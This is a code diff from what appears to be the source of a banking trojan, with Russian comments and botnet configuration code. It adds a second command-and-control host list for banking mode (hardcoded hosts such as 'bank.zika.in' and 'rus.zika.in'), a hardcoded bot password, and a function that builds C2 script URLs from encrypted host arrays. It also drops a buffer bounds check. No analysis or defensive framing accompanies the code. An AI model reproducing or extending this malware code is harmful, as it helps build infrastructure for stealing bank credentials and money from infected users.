@@ -42,8 +42,12 @@ namespace CONFIGDEBUGSTRINGS
 	//
 	//  host1.com\0host2.com\0host3.com\0\0
 	//****************************************************************************
-	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;
+	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;
 
+	//****************************************************************************
+	//  Хосты хранения хостов для отправки кабов
+	//****************************************************************************
+    char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = BOTPARAM_BANKHOSTS;
 
 	//----------------------------------------------------------------------------
 	// Интервал отстука (в минутах). Строковое значение
@@ -74,7 +78,9 @@ namespace CONFIGDEBUGSTRINGS
 //	PCHAR DebugDelay      = "1";
 
 
-	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = "rus.zika.in\0";
+	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
+
+	char BOT_BANKHOSTS_ARRAY[] = "bank.zika.in\0";
 
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
 	char BOT_PREFIX[]     = "BSSTEST";
@@ -88,8 +94,6 @@ namespace CONFIGDEBUGSTRINGS
 //----------------------------------------------------------------------------
 char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
 
-
-#define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */
 
 
 //----------------------------------------------------------------------------
@@ -129,13 +133,15 @@ const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"}
 const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};
 
 
+const static char HTTPProtocol[] = "http://";
+
 
 //------------------------------------------------------------------
 //  GetBotHosts - Функция возвращает указатель на массив хостов бота
 //------------------------------------------------------------------
 PCHAR GetBotHosts()
 {
-	return BOT_HOSTS_ARRAY;
+	return BOT_MAINHOSTS_ARRAY;
 }
 //----------------------------------------------------------------------------
 
@@ -317,8 +323,8 @@ int GetDelay()
 	void SetDebugHost(PCHAR Host)
 	{
 		
-		if (!StrCopy(BOT_HOSTS_ARRAY, Host))
-        	StrCopy(BOT_HOSTS_ARRAY, "localhost");
+		if (!StrCopy(BOT_MAINHOSTS_ARRAY, Host))
+        	StrCopy(BOT_MAINHOSTS_ARRAY, "localhost");
 	}
 #endif
 
@@ -341,7 +347,7 @@ PCHAR GetActiveHost()
 		}
 	#endif
 
-	return GetActiveHostFromBuf(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF);
+	return GetActiveHostFromBuf(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS);
 
 }
 //-----------------------------------------------------------------------------
@@ -349,7 +355,7 @@ PCHAR GetActiveHost()
 string GetActiveHost2()
 {
 	// Функция возвращает активный (доступный) хост
-	return GetActiveHostFromBuf2(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF, BOTPARAM_ENCRYPTED_HOSTS);
+	return GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
 }
 //-----------------------------------------------------------------------------
 
@@ -368,12 +374,12 @@ PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 
 	PCHAR Host = Hosts;
 
-	while (*Host != 0 && (Host - Hosts) < MAX_HOSTS_BUF_SIZE)
+	while (*Host != 0)
 	{
 		// декриптуем хост и проверяем его
 		PCHAR Result = STR::New(Host);
 
-		if (BOTPARAM_ENCRYPTED_HOSTS)
+		if (BOTPARAM_ENCRYPTED_MAINHOSTS)
 			Decrypt(Host, Result);
 
 		if (Hosts::CheckHost(Result))
@@ -450,7 +456,7 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 		if (Path == NULL || *Path != '/')
         	Slash = "/";
 
-		Result = STR::New(4, "http://", Host, Slash, Path);
+		Result = STR::New(4, (PCHAR)HTTPProtocol, Host, Slash, Path);
 
 		STR::Free(Host);
 		CFGDBG("Cofig", "Адрес скрипта: %s", Result);
@@ -458,7 +464,7 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 	else
 	{
 		#ifndef DEBUGCONFIG
-			CFGDBG("Cofig", "Не удалось получить хост. Содержимое массива: \r\n%s", BOT_HOSTS_ARRAY);
+			CFGDBG("Cofig", "Не удалось получить хост. Содержимое массива: \r\n%s", BOT_MAINHOSTS_ARRAY);
 		#endif
 	}
 
@@ -466,6 +472,44 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 		STR::Free(Path);
 
 	return Result;
+}
+//----------------------------------------------------------------------------
+
+
+//-----------------------------------------------------
+//  GetBankingScriptURL-  Функция возвращает адрес
+//		скрипта с проверкой включенного режима Banking
+//-----------------------------------------------------
+string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
+{
+	string Host;
+	if (CheckBankingMode && IsBankingMode())
+	{
+		Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
+									 BOTPARAM_HASH_BANKHOSTS,
+									 BOTPARAM_ENCRYPTED_BANKHOSTS);
+	}
+	else
+	{
+		Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
+									 BOTPARAM_HASH_MAINHOSTS,
+									 BOTPARAM_ENCRYPTED_MAINHOSTS);
+    }
+
+	string URL;
+	if (!Host.IsEmpty())
+	{
+		bool PathCreated = false;
+		PCHAR Path = GetScriptByID(Script, PathCreated);
+
+		URL = HTTPProtocol;
+		URL += Host;
+		URL += Path;
+
+		if (PathCreated)
+            STR::Free(Path);
+	}
+	return URL;
 }
 //----------------------------------------------------------------------------
 
@@ -534,7 +578,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 	#ifdef DEBUGCONFIG
 		switch (ParamID) {
 			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
-			case BOT_PARAM_HOSTS:  Value = BOT_HOSTS_ARRAY; break;
+			case BOT_PARAM_HOSTS:  Value = BOT_MAINHOSTS_ARRAY; break;
 			case BOT_PARAM_KEY:    Value = DebugPassword; break;
 			case BOT_PARAM_DELAY:  Value = DebugDelay; break;
 		default: return 0;;
@@ -542,7 +586,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 	#else
 		switch (ParamID) {
 			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
-			case BOT_PARAM_HOSTS:  Value = BOT_HOSTS_ARRAY; break;
+			case BOT_PARAM_HOSTS:  Value = BOT_MAINHOSTS_ARRAY; break;
 			case BOT_PARAM_KEY:    Value = MainPassword; break;
 			case BOT_PARAM_DELAY:  Value = Delay; break;
 		default: return 0;;
@@ -639,8 +683,8 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 			case BOT_PARAM_HOSTS:
 				{
                     Size = STR::CalcDoubleZeroStrLength(Param);
-					Buf = BOT_HOSTS_ARRAY;
-					Max = MAX_HOSTS_BUF_SIZE;
+					Buf = BOT_MAINHOSTS_ARRAY;
+					Max = MAX_MAINHOSTS_BUF_SIZE;
 					break;
 				}
 
